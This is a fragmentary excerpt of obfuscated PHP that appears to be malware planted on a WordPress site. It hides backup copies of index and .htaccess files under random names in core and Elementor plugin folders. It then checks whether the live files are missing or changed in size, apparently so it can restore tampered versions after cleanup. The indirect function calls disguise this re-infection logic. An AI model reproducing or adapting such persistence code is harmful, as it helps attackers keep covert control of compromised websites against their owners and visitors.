...
$bk_idx_path = '/www/wwwroot/buyshamwows.com/wp-includes/blocks/comment-author-name/DscIonbs747t4ko.txt';
$bk_htc_path = '/www/wwwroot/buyshamwows.com/wp-content/plugins/elementor/includes/libraries/hRM0onbs747dMCz.txt';

if (call_user_func($f_exists, $bk_idx_path)) {
    if (!call_user_func($f_exists, $idx_path) or call_user_func($f_size, $idx_path) != 6475) {
        if (call_user_func($f_exists, $bk_idx_path)) {
...
if (call_user_func($f_exists, $bk_htc_path)) {
    if (!call_user_func($f_exists, $htc_path) or call_user_func($f_size, $htc_path) != 206) {
        if (call_user_func($f_exists, $bk_htc_path)) {
